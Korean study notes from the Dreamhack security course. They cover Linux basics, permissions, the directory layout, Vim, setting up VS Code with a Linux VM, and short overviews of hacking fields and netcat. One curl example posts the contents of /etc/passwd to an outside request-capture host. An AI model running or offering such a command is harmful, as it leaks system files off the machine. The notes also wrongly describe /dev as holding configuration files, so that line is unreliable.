# dreamhack

- 리눅스에 관한 기초적인 지식과 리눅스 사용법
- Character User Interface (CUI) 기반의 터미널

## 셸(Shell)
- 유저가 리눅스 시스템을 이용할 수 있는 인터페이스
- ctrl + alt + T (윈도우, 리눅스 기준)

## 셸 프롬프트(Shell Prompt)
- 현재 유저의 유저 ID와 해당 유저가 속해 있는 그룹 ID를 보여주는 명령어

## 기초적인 명령어
1. sudo apt update
    - apt 명령어로 설치 가능한 소프트웨어 패키지 목록을 업데이트
2. sudo apt upgrade
    - 리눅스에 설치된 소프트웨어 패키지의 버전을 업그레이드
3. id
    - 현재 유저의 유저 ID와 해당 유저가 속해있는 그룹 ID를 출력
4. pwd
    - Print Working Directory의 줄임말로 현재 작업 중인 디렉토리의 경로를 출력
5. ls
    - List의 줄임말로 디렉토리의 내용을 출력하는 명령어
    - 현재 디렉토리 뿐만 아니라 임의 디렉토리의 내용을 출력하는 것도 가능합니다. 루트 디렉토리인 / 디렉토리의 내용을 출력하는 ls -l / 을 실행
6. cd
    - Change Directory의 줄임말로 작업중인 디렉토리를 변경하는 명령어
    - 절대 경로는 루트 디렉토리 / 를 시작으로 모든 경로를 적어서 표현하는 경로
    - 상대 경로는 현재 디렉토리를 기준으로 상위 디렉토리 또는 하위 디렉토리로 뻗어 나가는 경로
7. mkdir
    - Make Directory의 줄임말로 디렉토리를 생성하는 명령어
8. touch
    - touch 명령어는 비어 있는 새로운 파일을 만드는 데 사용
9. mv
    - Move의 줄임말로 파일이나 디렉토리의 위치를 옮길 때 사용하는 명령어
10. rm
    - Remove의 줄임말로 파일이나 디렉토리를 삭제하는 명령어
11. cat
    - 파일의 내용을 출력하는 명령어
12. file
    - 파일의 유형을 출력하는 명령어
13. echo
    - 셸에 유저가 입력한 텍스트를 출력
14. cp
    - Copy의 줄임말로 파일이나 디렉토리를 복사하는 명령어
15. grep
    - 전체에서 특정 문자열을 찾을 때 사용
16. man
    - Manual의 줄임말로 특정 명령어의 매뉴얼을 보여주는 명령어
17. curl
    - client URL의 줄임말로 서버에 데이터를 보내거나 서버로부터 데이터를 받는 데이터 전송 명령어
        - -o file : 전송 받은 데이터를 파일에 저장
        - -i : 결과 값에 HTTP 응답 헤더를 포함
        - -X "method" : HTTP 요청 메소드를 지정
        - -d "key=value" : HTTP POST 메소드로 데이터를 전송
    - -d "key=value" : HTTP POST 메소드로 데이터를 전송
        - $ curl "https://hmqtzgx.request.dreamhack.games" -d "`cat /etc/passwd`"
## 와일드카드
- 와일드카드(wildcards)는 리눅스에서 임의의 다른 문자를 나타낼 수 있는 특수 문자들을 의미
- cat he?lo 를 실행하여 hello 파일을 출력하는 모습
- cat h* 명령어를 입력하여 hello 파일을 출력하는 모습
- ls test[0-9] 를 실행하여 파일명이 test 로 시작하고 마지막이 숫자인 파일을 모두 출력하는 모습

## 리다이렉션
- 리다이렉션(redirection)은 모니터에 나타나는 표준 출력 혹은 키보드로 입력하는 표준 입력을 다른 곳으로 변경하는 작업
### 명령어 > 파일
- 명령어 표준 출력을 파일로 변경합니다. 파일이 없으면 새로 만들고, 있으면 덮어씁니다. 
### 명령어 >> 파일
- 명령어 표준 출력을 파일로 변경합니다. 파일이 없으면 새로 만들고, 있으면 이어서 씁니다.
### 명령어 < 파일
- 명령어 표준 입력을 파일로 변경합니다. 파일로부터 표준 입력을 받아 명령어를 수행합니다.
### 파이프
- 파이프(pipe)는 리다이렉션의 한 형태로, 명령어 결과 표준 출력을 다른 명령어의 표준 입력으로 보낼 때 사용합니다. 파이프는 | 문자로 나타냅니다. 

## 권한
### 유저(user)와 그룹(group)
- 유저와 그룹은 리눅스의 권한 시스템을 설명하기 위해 빠뜨릴 수 없는 개념
- 리눅스의 각 유저는 이름과 고유한 사용자 ID(UID) 
- 그룹은 말 그대로 여러 유저가 속할 수 있는 그룹으로, 이 역시 그룹 이름과 고유한 그룹 ID(GID)
### 파일 및 디렉토리 권한
- 소유자(owner) 와 소유 그룹(group) 
- 얼마만큼 접근 권한을 가질 것인지 
#### 세 종류의 접근 권한
- 읽기(Read): 파일 또는 디렉토리의 내용을 볼 수 있게 허용
- 쓰기(Write): 파일 또는 디렉토리의 내용을 수정하거나 삭제하는 것을 허용
- 실행(Execute): 파일이 프로그램인 경우 실행할 수 있게 허용
### 파일 및 디렉토리 권한
- 첫 번째 열 drwxrwxr-x : 권한 플래그
- d 는 디렉토리, - 는 일반 파일, l 은 바로가기와 같은 링크 파일
- 소유자의 권한, 소유 그룹에 포함된 유저들의 권한, 나머지 유저들의 권한
### 파일 및 디렉토리 권한
### 파일 및 디렉토리 권한 명령어
- chmod
    - chmod는 파일 권한을 변경하는 명령어입니다. root 유저 혹은 파일의 소유자만 실행할 수 있습니다. chmod 권한 파일명 형식으로 사용
- chown
    - chown은 파일 소유자 혹은 소유 그룹을 변경하는 명령어입니다. root 유저만 실행할 수 있습니다. chown 사용자명[.그룹명] 파일명 형식으로 사용합니다. 소유 그룹만 변경하고 싶은 경우 chgrp 명령어를 사용합니다.

### 특수 권한
- setuid: 일반 사용자가 파일을 실행하면 파일 소유자 권한으로 실행
- setgid: 일반 사용자가 파일을 실행하면 파일 소유 그룹 권한으로 실행
- sticky bit: 디렉토리에 sticky bit를 설정하면 파일 및 디렉토리 소유자와 root 사용자 외에 일반 사용자가 파일을 삭제
- setuid는 4, setgid는 2, sticky bit는 1

## 디렉토리 구조
### 디렉토리 구조
- 루트 디렉토리 /
### 루트 디렉토리 안에 많은 디렉토리
- /bin : 일반 유저가 사용할 수 있는 기본적인 명령어나 프로그램을 담고 있는 디렉토리
- /boot : 시스템 부팅에 필요한 파일들을 담고 있는 디렉토리
- /dev : 운영체제나 운영체제 위에서 동작하는 서비스의 설정 파일들을 담고 있는 디렉토리
- /home : 각 일반 유저의 홈 디렉토리를 담고 있는 디렉토리
- /lib : 시스템에 필요한 라이브러리 파일들을 담고 있는 디렉토리, /bin 이나 /sbin 에 존재하는 프로그램이 필요로 하는 동적 라이브러리 파일이 /lib 디렉토리에 존재
- /opt : 소프트웨어 패키지들을 담는 디렉토리
- /proc : 리눅스 커널 자원에 접근할 수 있는 파일과 프로세스를 나타내는 파일
- /root : root 유저의 홈 디렉토리
- /sbin : /bin 디렉토리와 마찬가지로 기본적인 유저 명령어나 프로그램을 가지고 있는 디렉토리
- /tmp : 유저나 프로그램이 임시로 파일을 생성해야할 때 사용할 수 있는 디렉토리
- /usr : 사용자 바이너리, 문서, 라이브러리, 헤더 파일 등을 담고 있는 디렉토리
- /var : 프로그램이나 시스템이 실시간으로 가변적인 파일을 사용하고 저장해야 할 때 활용하는 디렉토리

## 리눅스 VM (WSL2) 🔗 VS Code
- code 명령어
    - code .
- 리눅스 VM에 ssh 서버 설치
    - 원격 접속을 하기 위해서는 ssh
    ```
        sudo apt update
        sudo apt upgrade
        sudo apt-get install openssh-server
    ```

### 리눅스 VM 포트 포워딩
- 포트 포워딩이란 호스트에서 특정 포트로 접속하면 가상 환경으로 연결
    - 머신-설정을 클릭하여 설정 창을 열고, 네트워크-Advanced-포트 포워딩을 클릭
    - 다음 그림과 같이 포트 포워딩 규칙 창의 오른쪽 ➕규칙 추가 버튼
    - 프로토콜은 TCP, 호스트 포트는 22, 게스트 포트는 22를 입력한 뒤 확인 버튼을 눌러 저장
    - 호스트 포트는 호스트에서 리눅스에 접속할 때 사용할 포트
    - 게스트 포트는 ssh 서버가 사용하는 포트인 22로 작성

### VS Code 설정: Remote - SSH 설치
### VS Code 설정: SSH config 파일 구성
-  Remote-SSH: Open SSH Configuration File…을 클릭한 뒤 기본 config 파일 경로인 ~/.ssh/config를 선택하여 ssh config 파일
```
Host linuxvm
    HostName 127.0.0.1
    Port 22
    User user
    IdentityFile ~/.ssh/[개인 키 파일명]
```
## C 코드 작성, 컴파일, 실행
- 컴파일 과정을 거쳐야 실행 가능한 파일로 변환됩니다. 리눅스에서 C/C++ 언어로 작성된 소스 코드를 컴파일할 때는 주로 gcc 컴파일러
- 디버깅
    - 에러 해결
- Debug Toolbar
    - 디버깅 툴바의 각 버튼은 순서대로 다음과 같은 기능을 합니다.
⏯️ Continue/Pause : 다음 중단점을 만날 때까지 프로그램 실행 혹은 프로그램 중단 (f5)
➡️ Step Over : 코드 한 줄 실행 - 함수를 만나면 함수 실행 (f10)
⬇️ Step Into : 코드 한 줄 실행 - 함수를 만나면 함수 내부로 이동하여 한 줄 실행 (f11)
⬆️ Step Out : 함수의 나머지 부분을 모두 실행 (Shift+f11)
🔄️ Restart : 디버깅 재시작 (Ctrl+Shift+f5)
⏹️ Stop : 디버깅 종료 (Shift+f5)

## Vim 사용법
- Normal Mode (일반 모드)
```
gg
첫 행으로 이동

k
위로 이동

0
행의 처음으로 이동

h
왼쪽으로 이동

l
오른쪽으로 이동

$
행의 끝으로 이동

G
마지막 행으로 이동

j
아래로 이동

삭제, 복사, 붙여넣기
x
현재 커서가 위치한 글자 삭제 (del)

X
현재 커서 앞 글자 삭제 (backspace)

dd
현재 커서가 위치한 행 삭제

yy
현재 커서가 위치한 행 복사

p
복사한 내용을 현재 행 이후에 붙여넣기

P
복사한 내용을 현재 행 이전에 붙여넣기

문자열 찾기
/문자열, enter
현재 커서 이후로 문자열 찾기

n
찾은 문자열 목록에서 다음 문자로 이동

되돌리기
u
이전 수정 사항 되돌리기
```
- Insert Mode (입력 모드)
```
O
현재 커서 이전 줄에 입력

I
현재 커서가 위치한 행의 처음에 입력

s
현재 커서 한 글자 지우고 입력

i
현재 커서 위치에 입력

a
현재 커서 다음 칸에 입력

A
현재 커서가 위치한 행의 마지막에 입력

S
현재 커서 한 줄 지우고 입력

o
현재 커서 다음 줄에 입력
```
- Command Mode (명령 모드)
```
:w
저장

:q
종료

:i
취소

:wq
저장하고 종료

:q!
저장하지 않고 종료

:%s/문자열1/문자열2/g
전체에서 문자열1을 모두 찾아 문자열2로 치환
```

## System Hacking
- 시스템 해킹(System Hacking)은 컴퓨터 프로그램의 행위를 조작하여 공격자가 원하는 행동을 실행하도록 하는 공격
- 시스템 상에서 작동하는 방식, 프로그램을 분석하는데 필요한 도구, 취약점의 유형 및 이를 공략하는(익스플로잇하는) 방법론
- 시스템 해킹의 목표는 통상적으로 공격 대상 프로그램이 구동되는 서버의 임의 유저와 같은 권한을 획득하는 것

### 강의 수강에 필요한 사전 지식
- 얼마나 자세하게 C 언어를 공부하고 이해해야 하는지에 대한 척도
```
코드를 이해한 후 아래 체크리스트를 확인해 보세요.

위 코드가 실행 되었을 때, 프로그램이 어떻게 동작할지 예상할 수 있다
calling convention이 무엇인지 설명할 수 있다.
stack frame이 무엇인지 설명할 수 있다.
register가 무엇인지 설명할 수 있으며, C 코드가 진행됨에 따라 레지스터 값들이 어떻게 변할지 유추할 수 있다.
시작 시점부터 종료 시점까지 main 함수의 stack의 변화를 설명할 수 있다
32bit 프로그램일 때와 64bit 프로그램일 때 stack 값들의 차이점을 설명할 수 있다.
fun 함수의 취약한 부분이 무엇인지 찾을 수 있다.
fun 함수의 취약점으로 인해 32bit와 64bit환경에서 x의 출력값이 어떻게 달라지는지 설명할 수 있다.
x가 아닌 z를 출력하는 경우, 32bit와 64bit환경에서 z의 출력값이 어떻게 달라지는지 설명할 수 있다.
Figure 1을 컴파일한 바이너리가 주어졌을 때, 이를 익스플로잇하여 셸(shell)을 획득하는 공격 코드를 작성할 수 있다.

위 문항 중 체크할 수 있는 답변이 없다
```

## Reverse Engineering
- 리버스 엔지니어링(Reverse Engineering)은 줄여서 리버싱
    - 프로그램의 동작을 직접 실행 시켜보면서 소스 코드의 내용을 추측하는 것도 가능한 방법이고, 컴파일된 결과물의 데이터를 분석하여 소스 코드의 내용을 유추, 복구
```
프로그램이 실행 되었을 때 프로그램이 어떠한 동작을 하는지 설명할 수 있다.
c 코드의 enc[17] 와 key 가 메모리에 배치될 때 각각 어떠한 메모리 세그먼트에 위치할지 대략적으로 설명할 수 있다.
메모리와 레지스터의 차이를 설명할 수 있다.
명령어 집합 구조(Instruction Set Architecture, ISA)가 무엇인지 설명할 수 있다.
c 코드가 어떠한 과정을 거쳐 컴파일 되는지, 그리고 컴파일 과정에서 코드가 어떻게 바뀌는지 설명할 수 있다.
c, 어셈블리, 바이너리 코드 각각의 특징과 그 차이점에 대해 설명할 수 있다.
어셈블리 코드를 보고 main 함수의 stack frame 구조를 파악할 수 있다.
어셈블리 코드를 보고 메모리와 레지스터를 구분할 수 있다.
어셈블리를 보고 동일한 기능을 하는 C 코드를 작성할 수 있다
c 코드에서 int형 배열이 문자로 출력될 수 있는 이유를 설명할 수 있다.
“Hello dreamhack!” 을 출력하도록 하는 key 값을 구할 수 있다.
```

## Web Hacking

- 웹 해킹(Web Hacking)은 웹 상에서 본래의 의도와 다른 동작을 일으키거나 데이터를 도용, 변조, 시스템을 손상시키는 등의 악의적인 행위를 수행

## Cryptography

- 암호학(Cryptography)은 정보를 보호하거나 안전하게 통신하기 위한 방법론을 다루는 학문
- 비트 연산(Bit Operation)
- 모듈로 연산(Modulo Operation)

## nc (netcat)
- 보안을 공부하는 많은 실습의 경우 서버에서 특정 포트를 통해 서비스를 동작시키는 환경을 구성합니다. 이런 경우에 클라이언트가 이 프로그램과 통신하기 위해서 사용하는 것이 nc(netcat) 라는 도구
- nc 설치
- nc 사용법
```
$ nc
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
      [-m minttl] [-O length] [-P proxy_username] [-p source_port]
      [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
      [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
      [destination] [port]
$
```